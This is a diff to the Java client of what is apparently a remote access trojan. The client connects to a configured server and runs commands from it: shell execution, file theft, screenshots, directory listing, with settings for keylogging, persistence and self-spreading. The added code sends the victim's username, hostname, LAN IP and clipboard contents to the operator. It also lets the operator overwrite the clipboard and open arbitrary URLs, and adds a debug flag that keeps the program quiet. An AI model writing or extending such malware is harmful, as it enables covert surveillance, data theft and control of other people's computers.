@@ -1,13 +1,18 @@
 package Client;
 
-import com.github.sarxos.webcam.Webcam;
 
 import javax.imageio.ImageIO;
 import java.awt.*;
+import java.awt.datatransfer.Clipboard;
+import java.awt.datatransfer.DataFlavor;
+import java.awt.datatransfer.StringSelection;
 import java.awt.image.BufferedImage;
 import java.io.*;
+import java.net.InetAddress;
 import java.net.Socket;
+import java.net.URI;
 import java.util.ArrayList;
+import java.util.Arrays;
 import java.util.concurrent.TimeUnit;
 
 public class Client {
@@ -21,6 +26,11 @@ public class Client {
     private static File directory;
     private static DataInputStream dis;
     private static boolean keyLogger = true;
+
+    private static String USERNAME = System.getProperty("user.name");
+    private static String JRE_VERSION = System.getProperty("java.version");
+    private static String ARCH = System.getProperty("os.arch");
+
 
     public static void main(String[] args) throws Exception {
         /* Load server settings and then attempt to connect */
@@ -99,6 +109,9 @@ public class Client {
                 String input;
                 try {
                     input = dis.readUTF();
+                    if (debugMode) {
+                        System.out.println(input);
+                    }
                 } catch (EOFException e) {
                     break;
                 }
@@ -118,6 +131,46 @@ public class Client {
                     directoryChange();
                 } else if (input.contains("DOWNLOAD")) {
                     sendFile();
+                } else if (input.equals("SYINFO")) {
+                    /*
+                    "SYINFO" NOT A TYPO!!!!! Prevents clash with "SYS"
+                    SERVER: SYINFO
+                    CLIENT: SYINFO
+                    CLIENT: here's the info
+                     */
+                    System.out.println("Executing getAndSendSysInfo()");
+                    getAndSendSysInfo();
+                } else if (input.contains("CLIPSET")) {
+                    /*
+                    SERVER: CLIPSET "data"
+                     */
+                    String[] split = Arrays.copyOfRange(input.split(" "), 1, input.split(" ").length);
+                    StringBuilder toSet = new StringBuilder();
+                    for (String w : split) {
+                        toSet.append(w).append(" ");
+                    }
+                    Clipboard sysClip = Toolkit.getDefaultToolkit().getSystemClipboard();
+                    // Give it a second to hook
+                    Thread.sleep(200);
+                    StringSelection selection = new StringSelection(toSet.toString());
+                    sysClip.setContents(selection, selection);
+                    if (debugMode) {
+                        System.out.println("Clipboard set to: " + sysClip.getData(DataFlavor.stringFlavor));
+                    }
+                } else if (input.contains("CLIPGET")) {
+                    /*
+                    SERVER: CLIPGET
+                    CLIENT: CLIPGET
+                    CLIENT: clipdata
+                     */
+                    communicate("CLIPGET");
+                    Clipboard sysClip = Toolkit.getDefaultToolkit().getSystemClipboard();
+                    Thread.sleep(200);
+                    communicate((String) sysClip.getData(DataFlavor.stringFlavor));
+
+                } else if (input.contains("VISIT")) {
+                    System.out.println("GOING TO: " + new URI(input.split(" ")[1]).toString());
+                    Desktop.getDesktop().browse(new URI(input.split(" ")[1]));
                 } else if (input.contains("SCREENSHOT")) {
                     communicate("SCREENSHOT");
                     File f = null;
@@ -155,6 +208,9 @@ public class Client {
                 }
             }
         } catch (Exception e) {
+            if (debugMode){
+                e.printStackTrace();
+            }
             Thread.sleep(1000);
             connect();
         }
@@ -164,7 +220,9 @@ public class Client {
         try {
             dos.writeUTF(msg);
         } catch (IOException e) {
-            e.printStackTrace();
+            if (debugMode) {
+                e.printStackTrace();
+            }
         }
     }
 
@@ -172,8 +230,19 @@ public class Client {
         try {
             dos.writeInt(msg);
         } catch (IOException e) {
-            e.printStackTrace();
-        }
+            if (debugMode) {
+                e.printStackTrace();
+            }        }
+    }
+
+    // To be used for binary file transfers
+    private void communicate(byte[] msg){
+        try{
+            dos.write(msg);
+        } catch (IOException e){
+            if (debugMode) {
+                e.printStackTrace();
+            }        }
     }
 
     private void exec(String command) {
@@ -250,15 +319,17 @@ public class Client {
                 stringBuilder.append(line);
             }
             String[] settings = stringBuilder.toString().split(" ");
-            if (settings.length == 4) {
+            if (settings.length == 5) {
                 HOST = (settings[0]);
                 PORT = (Integer.parseInt(settings[1]));
                 isPersistent = (Boolean.parseBoolean(settings[2]));
                 autoSpread = (Boolean.parseBoolean(settings[3]));
+                debugMode = (Boolean.parseBoolean(settings[4]));
             }
         } catch (IOException e) {
-            e.printStackTrace();
-        }
+            if (debugMode) {
+                e.printStackTrace();
+            }        }
         xrcs.delete();
     }
 
@@ -282,7 +353,9 @@ public class Client {
             Client.directory = new File(directory);
             Client.directory.isDirectory();
         }
-        System.out.println(directory);
+        if (debugMode) {
+            System.out.println(directory);
+        }
         File[] files = new File(directory.getAbsolutePath()).listFiles();
         communicate(directory.getAbsolutePath());
         assert files != null;
@@ -323,7 +396,24 @@ public class Client {
             bs.close();
             fis.close();
         } catch (IOException e) {
-            e.printStackTrace();
-        }
+            if (debugMode) {
+                e.printStackTrace();
+            }        }
+    }
+
+    private void getAndSendSysInfo(){
+        communicate("SYINFO");
+        StringBuilder sb = new StringBuilder();
+        sb.append("OS: " + SYSTEMOS + "\n");
+        sb.append("Java version: " + JRE_VERSION + "\n");
+        sb.append("Username: " + USERNAME + "\n");
+        sb.append("Architecture: " + ARCH + "\n");
+        try {
+            InetAddress inetAddress = InetAddress.getLocalHost();
+            sb.append("LAN IP: " + inetAddress.getHostAddress() + "\n");
+            sb.append("Hostname: " + inetAddress.getHostName() + "\n");
+        } catch (IOException ioe){}
+        communicate(sb.toString());
+
     }
 }
